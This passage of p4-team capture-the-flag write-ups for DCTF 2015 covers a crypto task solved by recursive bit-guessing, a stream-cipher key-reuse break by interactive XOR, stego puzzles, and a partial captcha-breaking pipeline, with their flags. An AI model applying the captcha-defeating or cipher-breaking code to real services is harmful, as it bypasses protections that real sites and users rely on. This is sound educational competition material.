decrypt_r(orded_cipher, guessed_bits, i, length)\n\n\n    def decrypt_r(orded_cipher, guessedBits, i, length):\n        if i >= length:\n            print 'ok:', guessedBits\n            return\n        if i == 10:\n            print (int(''.join(str(c) for c in guessedBits[:10]), 2) / 1024.0) * 100, '%'\n        if verify(orded_cipher, guessedBits, length, i):\n            guessedBits[i] = 0\n            decrypt_r(orded_cipher, guessedBits, i + 1, length)\n            guessedBits[i] = 1\n            decrypt_r(orded_cipher, guessedBits, i + 1, length)\n\nThis was already reasonably fast. We fired this four times for different prefixes on one machine.\n\nBut since we had to wait anyway, we decided to try a different approach (viva la algorithmics). Instead of verifying the whole password every time (by going forward) we rejected impossible solutions right away:\n\n    def decrypt(cipherText):\n        guessed_bits = ['?'] * len(cipherText)\n        length = len(cipherText)\n        i = 0\n        orded_cipher = [ord(c) & 1 for c in cipherText]\n        decrypt_r(orded_cipher, guessed_bits, i, length, 10)\n    \n    \n    def try_guess(orded_cipher, guessedbits, i, length, guess, space):\n        guessedbits = list(guessedbits)\n        guessedbits[i] = guess\n        if i + space < length - 1:\n            nextndx = i + space\n        else:\n            nextndx = space\n    \n        nextbit = orded_cipher[i] ^ guess\n        if guess == 0:\n            newspace = space + 1\n        else:\n            newspace = space - 1\n    \n        if guessedbits[nextndx] == '?' or guessedbits[nextndx] == nextbit:\n            guessedbits[nextndx] = nextbit\n            decrypt_r(orded_cipher, guessedbits, i + 1, length, newspace)\n    \n    def decrypt_r(orded_cipher, guessedbits, i, length, space):\n        if i >= length:\n            print 'ok:', ''.join(str(c) for c in guessedbits)\n            return\n        if guessedbits[i] == '?':\n            try_guess(orded_cipher, guessedbits, i, length, 0, space)\n            try_guess(orded_cipher, guessedbits, i, length, 1, space)\n        elif guessedbits[i] == 0:\n            try_guess(orded_cipher, guessedbits, i, length, 0, space)\n        elif guessedbits[i] == 1:\n            try_guess(orded_cipher, guessedbits, i, length, 1, space)\n\nWe use a tri-value-boolean in guessedbits, 0 for `there is definitely 0`, 1 for `there is definitely 1` and ? for `don't know`.\n\nIt took us an hour to write this and debug but we got the results within a few seconds (while the previous version was still computing).\n\nAnyway, the final correct sulutions (for lowest bits of the plaintext) were four:\n\nsln = '1001011001110101110010100010110110010000010000100111010010111010010100111100001001110000011110010011110100101001010110010110101000110110100'\nsln = '1001011001110101110010100010110110000100010111010011010000011001001100111100111011110000000110100001110100101001010110010110101000110110100'\nsln = '0101011000010101110100001010000110100101001011010111000100111000010010000011001000110101001110101111110100001000110110101001010111111110100'\nsln = '0101011000010101110100001010000110100101001011000011000100111000110010001100011001110101000010100001110101100111000100101001010111001001011'\n\nThis way we got a set of equations with 140 variables. We tried to use a constraint-programming solver to solve it. For example for the bits number 4:\n\n    from constraint import *\n    problem = Problem()\n\n    ODD = range(33, 128, 2) + [13]\n    EVEN = range(32, 128, 2) + [10]\n\n    problem.addVariable(0, ODD)\n    problem.addVariable(1, EVEN)\n    problem.addVariable(2, EVEN)\n    problem.addVariable(3, ODD)\n    problem.addVariable(4, EVEN)\n    # (...) snip\n    problem.addVariable(134, ODD)\n    problem.addVariable(135, EVEN)\n    problem.addVariable(136, ODD)\n    problem.addVariable(137, EVEN)\n    problem.addVariable(138, EVEN)\n\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x32, (0, 10))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0xb, (1, 10))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x1c, (2, 12))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x59, (3, 14))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x0, (4, 14))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x18, (5, 16))\n    # (...) snip\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x6, (133, 17))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x30, (134, 16))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x11, (135, 15))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0xe, (136, 16))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0xb, (137, 15))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0xb, (138, 16))\n\n    print problem.getSolutions()\n\nUnfortunately, it was taking a long time (and we're not sure if it would compute in this century). So in the meanwhile we attempted to make a custom solver:\n\n    import string\n    slv = [None] * len(sln)\n    \n    def filling_pass(slv):\n        while True:\n            any = False\n            space = 10\n            for i in range(len(sln)):\n                if i + space < len(sln) - 1:\n                    nx = i + space\n                else:\n                    nx = space\n                if sln[i] == '0':\n                    space += 1\n                else:\n                    space -= 1\n                if slv[i] is not None:\n                    sn = ord(slv[i]) ^ ord(ciph[i])\n                    if slv[nx] is None:\n                        slv[nx] = chr(sn)\n                        if (sn >= 32 and sn < 127) or sn == 10 or sn == 13:\n                            any = True\n                        else:\n                            return False\n                    else:\n                        if slv[nx] != chr(sn):\n                            return False\n            if not any:\n                return True\n    \n    def tryit(slvo, start):\n        while slvo[start] is not None:\n            start += 1\n            if start >= len(slvo):\n                print ''.join(' ' if c is None else '.' if ord(c) < 32 else c for c in slvo)\n                return\n            continue\n        for c in string.printable:\n            slv = list(slvo)\n            slv[start] = c\n            possible = filling_pass(slv)\n            if possible:\n                tryit(slv, start)\n    \n    tryit(slv, 0)\n\nAnd again for the second time in this task, what was taking hours in the naive implementation, took only *seconds* with a better algorithm. It's nice to think that even though we get more and more powerful computers, thinking about the computational complexity pays off sometimes.\n\nThe solver worked like this:\n\n    plaintext = ['?'] * plaintext_length\n    while (not all characters in plaintext are decoded):\n        for char in charset:\n            use char as next letter in password\n\t\t\tusing known constraints try to figure out as much as possible of next characters in plaintext (filling_pass function). If there is a constraint violation break, otherwise repeat recursively.\n\nThis way we got:\n\n    C:\\Users\\xxx\\Code\\RE\\CTF\\2015-10-02 def\\crypto300>python hackz.py\n    Cpgl5bpyy5qz{p5lz`5VAS5eb{pg;5[zb5\\5}tcp5az5r|cp5lz`5a}p5gpbtgq5szg5tyy5a}|f5}tgq5bzg~5zg5xtlwp5r`pff|{r;5A}p5sytr5|f5vgleat{tylf|fJ|fJ}tgq\n    Izmf?hzss?{pqz?fpj?\\KY?ohqzm1?Qph?V?w~iz?kp?xviz?fpj?kwz?mzh~m{?ypm?~ss?kwvl?w~m{?hpmt?pm?r~f}z?xjzllvqx1?Kwz?ys~x?vl?|mfok~q~sflvl@vl@w~m{\n    Qbu~'pbkk'chib'~hr'DSA'wpibu)'Ihp'N'ofqb'sh'`nqb'~hr'sob'ubpfuc'ahu'fkk'sont'ofuc'phul'hu'jf~eb'`rbttni`)'Sob'akf`'nt'du~wsfifk~tntXntXofuc\n    Rav}$sahh$`kja$}kq$GPB$tsjav*$Jks$M$lera$pk$cmra$}kq$pla$vasev`$bkv$ehh$plmw$lev`$skvo$kv$ie}fa$cqawwmjc*$Pla$bhec$mw$gv}tpejeh}wmw[mw[lev`\n    S`w|%r`ii%ajk`%|jp%FQC%urk`w+%Kjr%L%mds`%qj%bls`%|jp%qm`%w`rdwa%cjw%dii%qmlv%mdwa%rjwn%jw%hd|g`%bp`vvlkb+%Qm`%cidb%lv%fw|uqdkdi|vlvZlvZmdwa\n    Tgp{\"ugnn\"fmlg\"{mw\"AVD\"rulgp,\"Lmu\"K\"jctg\"vm\"ektg\"{mw\"vjg\"pgucpf\"dmp\"cnn\"vjkq\"jcpf\"umpi\"mp\"oc{`g\"ewgqqkle,\"Vjg\"dnce\"kq\"ap{rvclcn{qkq]kq]jcpf\n    Ufqz#tfoo#glmf#zlv#@WE#stmfq-#Mlt#J#kbuf#wl#djuf#zlv#wkf#qftbqg#elq#boo#wkjp#kbqg#tlqh#lq#nbzaf#dvfppjmd-#Wkf#eobd#jp#`qzswbmbozpjp\\jp\\kbqg\n    Very well done you CTF pwner. Now I have to give you the reward for all this hard work or maybe guessing. The flag is cryptanalysis_is_hard\n    Wdsx!vdmm!enod!xnt!BUG!qvods/!Onv!H!i`wd!un!fhwd!xnt!uid!sdv`se!gns!`mm!uihr!i`se!vnsj!ns!l`xcd!ftdrrhof/!Uid!gm`f!hr!bsxqu`o`mxrhr^hr^i`se\n    Xk|w.ykbb.ja`k.wa{.MZH.~y`k| .@ay.G.foxk.za.igxk.wa{.zfk.|kyo|j.ha|.obb.zfg}.fo|j.ya|e.a|.cowlk.i{k}}g`i .Zfk.hboi.g}.m|w~zo`obw}g}Qg}Qfo|j\n\n    C:\\Users\\xxx\\Code\\RE\\CTF\\2015-10-02 def\\crypto300>\n\nGreat, we got the flag - `cryptanalysis_is_hard`\n", "timestamp": "2025-10-21T22:03:08.091483"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/crypto_50/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/crypto_50/README.md", "content": "﻿## Crypto 50 (crypto, 50p)\n\n### PL\n\n[ENG](#eng-version)\n\nBardzo przyjemne (dla autora tego writeupa) zadanie. Dostajemy 10 tekstów zaszyfrowanych tym samym stream cipher (z tym samym IV/kluczem), i mamy za zadanie rozszyfrować 11.\n\nTeksty w pliku [input.txt](input.txt)\n\nOrientujemy się od razu, że to sytuacja podobna do tego gdy wszystkie teksty zostały zaszyfrowane tym samym one time padem. A na to są sposoby.\n\nOczywiście jeden sposób to napisanie masę skomplikowanego kodu bruteforcującego różne możliwości i wybierający najlepszy plaintext (np. taki który mieści sie w wymaganym charsecie). To rozwiązanie dobre do specjalistycznych zastosowań/mechanicznego łamania, ale my mamy znacznie _zabawniejszy_ sposób, do zapisania w kilkunastu linijkach pythona:\n\n    dat = open('input.txt').readlines()\n    dat = [x.strip().decode('hex') for x in dat]\n\n    def xor(a, b):\n        return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))\n\n    def interactive_hack(xored):\n        while True:\n            print \">\", \n            i = raw_input()\n            for x in xored:\n                print \" -> \", xor(i, x)\n\n    xored = [xor(dat[0], d) for d in dat[1:]]\n    interactive_hack(xored)\n\nI tyle. Co nam to daje? Otóż możemy zgadywać w ten sposób hasło \"interaktywnie\" - Na przykład jest spore prawdopodobieństwo że któryś z plaintextów zaczyna się od \"You\" - spróbujmy więc:\n\n    > You\n     ->  {&j&\n     ->  nn`h\n     ->  nnl;\n     ->  {&v<\n     ->  {&v<\n     ->  sh%)\n     ->  s`)h\n     ->  {hj<\n     ->  xok)\n     ->  mn`&\n\nMeh. To może \"The \"?\n\n    > The\n     ->  v!z&\n     ->  ciph\n     ->  ci|;\n     ->  v!f<\n     ->  v!f<\n     ->  ~o5)\n     ->  ~g9h\n     ->  voz<\n     ->  uh{)\n     ->  `ip&\n\nStrzał w dziesiątkę. Widać początek słowa \"cipher\", więc próbujemy:\n\n    > cipher\n     ->  A one-'\n     ->  The ke*\n     ->  This m2\n     ->  A stre2\n     ->  A stre2\n     ->  In a s*\n     ->  If, ho$\n     ->  Anothe!\n     ->  Binarys\n     ->  When u\n\nOstatni znak nie ma sensu nigdzie, więc podejrzewamy że to jednak miało być inne słowo (np. ciphers). Ale idziemy dalej, i tak aż do końca:\n\n![](fun.PNG)\n\nFlaga: `When using a stream cipher, never use the key more than once!`\n\n### ENG version\n\nVery nice (at least for the auther of the writeup) task. We get 10 ciphertexts encoded with the same stream cipher (with the same IV and key) and we have to decode 11th.\n\nInput texts in [input.txt](input.txt)\n\nWe realise that this is a similar case to encoding all the texts with the same one time pad. But this can be handled.\n\nOf course we could have written a lot of complex brute-force code testing multiple possibilities and choosing the best plaintext (eg. the one that fits into selected charset). This is a good task for automatic code breaking, but we came up with a more `fun` idea, which could have been written in just few lines of code:\n\n    dat = open('input.txt').readlines()\n    dat = [x.strip().decode('hex') for x in dat]\n\n    def xor(a, b):\n        return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))\n\n    def interactive_hack(xored):\n        while True:\n            print \">\", \n            i = raw_input()\n            for x in xored:\n                print \" -> \", xor(i, x)\n\n    xored = [xor(dat[0], d) for d in dat[1:]]\n    interactive_hack(xored)\n\nAnd that's it. What does it give us? We can try to break the code in an \"interactive\" way. We just try to guess the begining of one of the plaintexts - we assume that there is possibility that it starts with \"You\" so we try:\n\n    > You\n     ->  {&j&\n     ->  nn`h\n     ->  nnl;\n     ->  {&v<\n     ->  {&v<\n     ->  sh%)\n     ->  s`)h\n     ->  {hj<\n     ->  xok)\n     ->  mn`&\n\nNot this time, so maybe \"The \"?\n\n    > The\n     ->  v!z&\n     ->  ciph\n     ->  ci|;\n     ->  v!f<\n     ->  v!f<\n     ->  ~o5)\n     ->  ~g9h\n     ->  voz<\n     ->  uh{)\n     ->  `ip&\n\nBingo! We can see a \"ciph\" word prefix so we try \"cipher\":\n\n    > cipher\n     ->  A one-'\n     ->  The ke*\n     ->  This m2\n     ->  A stre2\n     ->  A stre2\n     ->  In a s*\n     ->  If, ho$\n     ->  Anothe!\n     ->  Binarys\n     ->  When u\n\nLast character does not make sense so we assume this must be a different word (eg. ciphers). We proceed until the end:\n\n![](fun.PNG)\n\nFlaga: `When using a stream cipher, never use the key more than once!`", "timestamp": "2025-10-21T22:03:08.373027"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/crypto_50/input.txt", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/crypto_50/input.txt", "content": "f363844fd41932070e24df7f6c2397b4f0ee4bc567c32e6f8be4665116657ff880756558fe63f47975fa94e8fa1efc6e97cf9c99931ce21d7b03ef4f61bdc6f74fc566cac6f0fe7b939237d3ab9e37adf9910cfc899ed3ff7b79ead95b8aced21ec1079c72409e878425fd61026fbf1e9319ff6dc4c75c356f04ffe204ce480c488ff34eb78034aa23d87309\nd12a9b49d446354e0020912f6f2297b7eaee4f8062c32479d2f66253016b6ab182723152ff69a46178ebd1e5e04ae760978b9c929319ab0a6018b70a5bf5d6b946d27ad8d9e3f9769b923dc9fb953db2b7d816f1889ecbf86a3cbec45e8aced213c44ebd5275cad3d72ef9631f72a15b8f57f123cac412742e03b6fb098b1c350d9bf25db78023ab3690751276f46d9e598a1f0b\nc4629107da0e38541937d43e6366dab7eaff1cc266c32879c5e06440106f63b18e7b7c41fc61a06871e694e8ed4ae760978b9c92930aab19614cf85e2ff1d6f85ec323dfc5f4bc6497df319ab7933cb8a1d958f59f9ec8f97b74eedc578680d61add53f3477ed687942bfe6a1972f2198519e170ced412786105bab618c309340d92f34cbf\nc4629d549106204c0836912b662397b1e0f848c56ec33979d9fc3642116765f49f677e5cf524a0623df6d9f9f50ff864979bd396dd5db21f680fed436cf89fb94cd9678bcce2bc76d6c031c9ae9a26ffa1d91db483d0d9bc6a3df3d5169f8fc65fcd46a0067eddd3d728f5611826a512845cf87a8bc541706a5bfff314c80d2a59ddfb40a88023ab36907b1475e8288f5f86131689d8606623e1629bca36e38a53608b88\nd12a8753c30e204a4d26d82f6623c5e2f4ea57c570c33a6fcea57947446b27fc98777911e369b56171fac6a9f804f1219480819a931ead037f09f7436af3c7b946d27a8bdee4ff7fd6d3279aeac46affb7d80ce7c29efef06d31fa905981ced617cc54f34d75cb8bd723e4241163bc1e9258e066d89053357e04bae308c41a3b4399f242facb32ba20c4641e67f1\nd12a8753c30e204a4d26d82f6623c5e2feee52c571823b79d8a56554076962e29e7d6754b061b86870fadafdea4afa67d99b9b9a9316a7147a18eb4f6ef093fb4cc466cf8dfef23797dc74d3b58237adbbd014b49fcadde57b\nd964d446911838490e2dc3306029c2b1b9f848d26682223cc8ec6649017827f0cd676543f565b92d72f994f9ea0fe06596c2819edd19ad002908f04d66e9c0b944c423ccc8fff96597c631defb9f3cbbb0c11dfa88dbd2e5722dbedf50cf9aca1a8557bf4779dcd39232e4241768b65b8350e46bcec246707603fffb09d81b3b4a98ee03fac139a773c47e1e68bc6b83408d0e118fdd2c312be57ad7d73de7de4a638492956d6ecc9d\nd96cd807d90436421b20c3732e2797a6f0ec55d4238a3c3cc8ea6453117a73f48934785fb070a66c73ecd9e0ea19fc6e97c3d38dd209aa087b4ced426ef393f849d366cf8dfeee379add27cef7d63db1b9c858f5cccdd5ff7938fb90528689cb0b854ebd0664dac2d73afc651f68a61e984db46ad89053736812bce209cf483b4399bd5bb2c577a621c2790926f867895ecf09109e997c342de17390c221e7de4e60c5948f716ec6c9c6322151f9dbb8fe9f411876eb04576524f3f4d6\nd1649b53d90e33070c35c12d6127d4aab9fe4fc570c33c79dde06440082a68f7cd607954b074a6686bf6dbfcea4adb219a868397d60fb6087118b94e66fadaed5e9777c48df2f37a86c720dffb823abaf5da1ded9fcacef47f39b090659a8dca5fd644bb437dd7d4d72be261566dbc149757b462d89041706211f2e515c50b325f92f346a0c939a473c3620963fd65cc4e8617178fcb7f\nd2639a46c31261541937d43e6366d4abe9e359d270c32e6ecea57947106f69b18e7b7f42e476a16e69fad0a9ec19fc6f9ecf9f96dd18a31f290afc4f6bffd2fa469770c3c4f7e83784d733d3a88237ada6911af18fdfc9e27b74ead85396cec11ecb07b14330d7c68423fc7d566fbf0b8c5cf966c5c457712e1eb1b604ca1a3e5a9cef4afac139a773d3771526fe6dcc5f8a061b83d5756623ff739bda26e79a1a62848f937c66d59ddf303249e682\nc7629149911e324e0322913e2e35c3b0fcea5180608a3f74cef73a010a6f71f49f346442f524a06578bfdfece04af86e8b8ad38bdb1cac4d6602fa4f2e\n", "timestamp": "2025-10-21T22:03:08.478685"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/misc_100_doesnt_matter/readme.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/misc_100_doesnt_matter/readme.md", "content": "## She said it doesn't matter (misc/stego, 100p)\n\n### PL Version\n[ENG](#eng-version)\n\nW zadaniu dostajemy obrazek [png](./m100.png) z zepsutym nagłówkiem. Rozpakowujemy zawartość pliku i za pomocą pozyskanych pikseli tworzymy obrazek, w którym ukryta jest flaga. Musimy ustawić dobre wymiary obrazka, które różnią sie od odczytanych z nagłówka. Po paru próbach odnajdujemy właściwe wartości.\n\n```python\nfrom PIL import Image\nwith open('zlibdec.bin','rb') as f:\n\tdata=f.read()\nim = Image.frombytes('RGB',(891,550),data)\nim.show()\n```\ni w wyniku otrzymujemy:\n\n![](./misc100.png)\n### ENG Version\nWe get png picture with broken header checksum. With pixels extracted from file we make picture using them. We have to set good size of picture and mode, since data from broken header are misleading. After some trials we can easly find right values.\n```python\nfrom PIL import Image\nwith open('zlibdec.bin','rb') as f:\n\tdata=f.read()\nim = Image.frombytes('RGB',(891,550),data)\nim.show()\n```\nas a result we get:\n\n![](./misc100.png)\n", "timestamp": "2025-10-21T22:03:08.721618"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/misc_200_try_harder/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/misc_200_try_harder/README.md", "content": "﻿## Try harder! (misc/stego, 200p)\n\n### PL Version\n[ENG](#eng-version)\n\nW zadaniu dostajemy dwa archiwa:\n* gzip o nazwie part0\n* zip o nazwie part3, wymagające hasła do dekodowania\n\nRozpoczęliśmy od analizy archiwum part0 i pierwsze co rzuciło sie w oczy to fakt, że 4MB archiwum dekompresowało sie do 4GB pliku jpg. Analiza archiwum za pomocą hexedytora pozwoliła zauważyć, że w rzeczywistości archiwum jest wypełnione dużą ilością dziwngo paddingu. Okazało się, że był to plik jpg tylko z rozszerzenia - tak naprawdę był to DOS/MBR bootsector. Jego zamontowanie daje dostęp do obazka:\n\n![](./pk8gZNX.jpg)\n\nAnaliza bootsectora za pomocą hexedytora pozwala znaleźć jeszcze linki do serwisu imgur, ale nadal nic przydatnego. Analiza archiwum part0 pomocą binwalka pozwala znaleźć wewnatrz ukryty [plik mp3](./3pm.redrah-yrt.mp3), który jest odwróconym nagraniem słów `try harder`. Niemniej analiza tego pliku pozwala znaleźć ciekawy string zapisany w tagach ID3:\n\n`aHR0cDovL2RjdGYuZGVmLmNhbXAvX19kbmxkX18yMDE1X18vcGFydDEuaHRtbATXXX`\n\nKtóry po dekodowaniu jako base-64 daje nam: `http://dctf.def.camp/__dnld__2015__/part1.html`\n\nPod znalezionym urlem znajdujemy [plik html](./source.txt). Analiza źródła pozwala zauważyć że znajdują się tam białe znaki ułożone w sposób nieprzypadkowy.\n\nEkstrakcja białych znaków i przetworzenie ich za pomocą skryptu:\n\n\tx = open('wut.txt', 'rb').read()\n\tfor i in range(256):\n\t\tif i == ord(' ') or i == ord('\\t'):\n\t\t\tcontinue\n\t\tx = x.replace(chr(i), '')\n\tx = x.replace(' ', '0')\n\tx = x.replace('\\t', '1')\n\topen('wut2.txt', 'wb').write(x)\n\t\nDała jako wynik:\n\n\t['01010011', '01100101', '01100011', '01101111', '01101110', '01100100', '00100000', '01110000', '01100001', '01110010', '01110100', '00100000', '01101001', '01101110', '00100000', '01101101', '01101001', '01110011', '01100011', '00110010', '00110000', '00110000', '01110000', '01100001', '01110010', '01110100', '00110010', '00101110', '01111010', '01101001', '01110000']\n\tSecond part in misc200part2.zip\n\t\nKolejne archiwum zawiera pliki [file1.bmp](./file1.bmp) oraz [file2](./file2). Analiza drugiego pliku pozwala zauważyć, że bajty w nim można także intepretować jako obraz bmp i że zawiera on tekst:\n\n![](./second.png)\n\n`binary_and_xor_is_how_we`\n\nOba pliki mają identyczne rozmiary i wewnętrznie przypominają bitmapy. Ale tam gdzie powinien być nagłówek bmp w drugim pliku, znajdowały się zera. Więc przekeiliśmy nagłówek z pierwszego pliku i jako efekt uzyskaliśmy obraz z całym tekstem: `binary_and_xor_is_how_we_all_start`\n\n![](./fullsecond.bmp)\n\nTestujemy tą wiadomość jako hasło dla pliku part3.zip i bingo! Rozpakowujemy archiwum i znajdujemy tam [zdjecie](./part3.jpg) które zawiera szukaną flagę:\n\n`DCTF{711389441a47c19a244c8473ee5aceff}`\n\n### ENG Version\n\nWe get two archives:\n* gzip named part0\n* zip named part3, encrypted with a password\n\nWe start with analysis of the part0 archive and first thing we notice is that 4MB archive decompresses into a 4GB jpg file. In reality it turned out that is isn't a jpg file at all, it's a DOS/MBR bootsector. Mounting it gives the picture:\n\n![](./pk8gZNX.jpg)\n\nFurther analysis of bootsector file with hexeditor gives us also some links to imgur but nothing useful. Further analysis of the part0 archive with binwalk give us a hidden [mp3 file](./3pm.redrah-yrt.mp3), containing a reversed recording of `try harder`. Analysis of this file allows us to find an interesting string inside ID3 tags:\n\n`aHR0cDovL2RjdGYuZGVmLmNhbXAvX19kbmxkX18yMDE1X18vcGFydDEuaHRtbATXXX`\n\nDecoding it as base64 gives: `http://dctf.def.camp/__dnld__2015__/part1.html`\n\nThe URL holds a single [html file](./source.txt). Source code analysis shwows that there is a very particular layuot of whitespaces.\nExtraction of whitespace characters and processing with:\n\n\tx = open('wut.txt', 'rb').read()\n\tfor i in range(256):\n\t\tif i == ord(' ') or i == ord('\\t'):\n\t\t\tcontinue\n\t\tx = x.replace(chr(i), '')\n\tx = x.replace(' ', '0')\n\tx = x.replace('\\t', '1')\n\topen('wut2.txt', 'wb').write(x)\n\t\nGives us:\n\n\t['01010011', '01100101', '01100011', '01101111', '01101110', '01100100', '00100000', '01110000', '01100001', '01110010', '01110100', '00100000', '01101001', '01101110', '00100000', '01101101', '01101001', '01110011', '01100011', '00110010', '00110000', '00110000', '01110000', '01100001', '01110010', '01110100', '00110010', '00101110', '01111010', '01101001', '01110000']\n\tSecond part in misc200part2.zip\n\t\nNext archive contains [file1.bmp](./file1.bmp) and [file2](./file2). Second file analysis shows that it can be also interpreted as bmp and contains some text:\n\n![](./second.png)\n\n`binary_and_xor_is_how_we`\n\nBoth files have identical size, and looks like bmp files when looked at in hexeditor - but second file's header was replaced with zeroes. So we copied header from first file to second, and as a result we got a picture with full text: `binary_and_xor_is_how_we_all_start`\n\n![](./fullsecond.bmp)\n\nWe try this message as a password for part3.zip and bingo! We decompress the archive and find a single [picture](./part3.jpg) with the flag:\n\n`DCTF{711389441a47c19a244c8473ee5aceff}`\n", "timestamp": "2025-10-21T22:03:08.979202"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/misc_200_try_harder/source.txt", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/misc_200_try_harder/source.txt", "content": "\n<body>\n<div>\nCapture the\tFlag (CTF)\tis a special\tkind\tof information\tsecurity\tcompetitions. There are\tthree common\ttypes of\tCTFs:\tJeopardy, Attack-Defence and mixed.\t\n<br/>Jeopardy-style\tCTFs has\ta\tcouple of\tquestions\t(tasks)\tin\trange of\tcategories.\tFor example,\tWeb,\tForensic,\tCrypto, Binary or\tsomething\telse. Team can\tgain some points for every\tsolved task. More points for more complicated\ttasks\tusually.\tThe next task in chain can\tbe\topened only after some team\tsolve previous\ttask.\tThen\tthe game time\tis over sum\tof\tpoints\tshows you\ta CTF winer. Famous example\tof such CTF is Defcon CTF quals.\t\n<br/>Well,\tattack-defence is\tanother interesting kind\tof competitions.\tHere\tevery team\thas\town\tnetwork(or only one host)\twith vulnarable services. Your team has time\tfor\tpatching your\tservices\tand developing\texploits usually.\tSo,\tthen organizers\tconnects participants of\tcompetition and\tthe\twargame\tstarts! You should\tprotect\town red\therring\tfor defence points and\thack\topponents for attack\tpoints.\tHistorically this is\ta first type of\tCTFs,\teverybody knows about DEF CON CTF -\tsomething\tlike a World Cup of all\tother\tcompetitions.\t\n<br/>Mixed competitions may vary possible formats.\tIt\tmay be something like wargame\twith special\ttime\tfor\ttask-based elements (like\tUCSB iCTF). \n<br/>CTF\tgames\toften\ttouch on\tmany other aspects of information\tsecurity:\tcryptography, stego, binary\tanalysis, reverse engeneering, mobile\tsecurity and\tothers.\tGood\tteams generally have\tstrong\tskills\tand\texperience in\tall these issues.\t\n<br/>All\trights reserved\tto ctftime.org \n<br/>Enjoy\tthis CTF\tand\tget\tin the final round! \n</div>", "timestamp": "2025-10-21T22:03:09.084118"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/misc_400_captcha/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/misc_400_captcha/README.md", "content": "﻿## Can you read Pacifico? (misc/ppc, 400+1p)\n\n### PL Version\n[ENG](#eng-version)\n\nZadanie polegało na napisaniu łamacza captchy. Captche miały następujący format:\n\n![](./captcha.png)\n\nNależało rozwiązać 1337 kodów pod rząd bezbłędnie w celu uzyskania flagi.\n\nJak nie trudno zauważyć konieczne będzie przetworzenie obrazu do wersji bardziej przystępnej do automatycznej analizy. Stosujemy algorytm, który przetworzy podany obraz do postaci czarnego tekstu na białym tle. Wykonujemy to za pomocą zestawu 2 funkcji:\n\n\tdef fix_colors(im):\n\t\tcolors_distribution = im.getcolors(1000)\n\t\tordered = sorted(colors_distribution, key=lambda x: x[0], reverse=True)\n\t\tbest_colors = [color[1] for color in ordered]\n\t\tif (255, 255, 255) in best_colors:\n\t\t\tbest_colors.remove((255, 255, 255))\n\t\tif (0, 0, 0) in best_colors:\n\t\t\tbest_colors.remove((0, 0, 0))\n\t\tbest_colors = best_colors[:2]\n\t\tpixels = im.load()\n\t\tfor i in range(im.size[0]):\n\t\t\tfor j in range(im.size[1]):\n\t\t\t\tcolor = pixels[i, j]\n\t\t\t\tif color not in best_colors:\n\t\t\t\t\tpixels[i, j] = best_colors[0]\n\t\treturn best_colors[0]\n\n\n\tdef black_and_white(im, filling):\n\t\tblack = (0, 0, 0)\n\t\twhite = (255, 255, 255)\n\t\tpixels = im.load()\n\t\tfor i in range(im.size[0]):\n\t\t\tfor j in range(im.size[1]):\n\t\t\t\tcolor = pixels[i, j]\n\t\t\t\tif color == filling:\n\t\t\t\t\tpixels[i, j] = white\n\t\t\t\telse:\n\t\t\t\t\tpixels[i, j] = black\n\t\t\t\t\t\nPierwsza służy do usunięciu z obrazu wszystkich oprócz 2 dominujacych kolorów (którymi jest wypełnienie i tekst), przy czym szukajac dominujących kolorów nie bierzemy pod uwagę białego i czarnego, aby nie wybrać któregoś z nich jako koloru wypełnienia.\n\nDruga funkcja zamienia kolor tekstu na czarny a kolor wypełnienia na biały. W efekcie uzyskujemy:\n\n![](./captcha_color.png)\n\nA następnie:\n\n![](./captcha_bw.png)\n\nNiestety jak nie trudno zauważyć nasze captche są bardzo bardzo małe. Za małe żeby OCR był w stanie poprawnie i bezbłędnie je odczytać. Stosujemy więc inną metodę. Jeden z naszych kolegów poświecił się i zmapował stosowaną czcionkę tworząc pliki z każdym potrzebnym symbolem:\n\n![](./alphabet.png)\n\nAlgorytm dekodowania captcha wyglądał następujaco:\n\n1. Pobieramy captche\n2. Poprawiamy kolory i zamieniamy na czarno-białe\n3. Pobieramy prostokąt obejmujacy captchę\n4. Dla każdego symbolu z alfabetu znajdujemy najlepsze dopasowanie go do captchy (takie gdzie najbardziej się z nią pokrywa), zapamiętujemy też pozycje tego dopasowania\n5. Wybieramy najlepiej dopasowany symbol\n6. Usuwamy z captchy dopasowany symbol poprzez zamalowanie go na biało\n7. Kroki 4-6 powtarzamy 6 razy, bo szukamy 6 symboli.\n8. Sortujemy uzyskane symbole względem pozycji dopasowania w kolejnosci rosnacej aby odtworzyć poprawną kolejność symboli\n\nDla prezentowanej wyżej captchy sesja dekodowania wygląda tak (najlepiej dopasowany symbol oraz obraz po jego usunięciu):\n\n`('H', 155)`\n\n![](./h.png)\n\n`('G', 122)`\n\n![](./g.png)\n\n`('U', 103)`\n\n![](./u.png)\n\n`('E', 99)`\n\n![](./e.png)\n\n`('Z', 86)`\n\n![](./z.png)\n\n`('9', 46)`\n\n![](./9.png)\n\nW wyniku czego uzyskujemy kod: `EUZGH9`\n\nDwie funkcje, o których warto wspomnieć to funkcja licząca jak dobre dopasowanie znaleźliśmy oraz funkcja usuwająca symbole z obrazu.\n\n\tdef test_configuration(im_pixels, start_x, start_y, symbol_len, 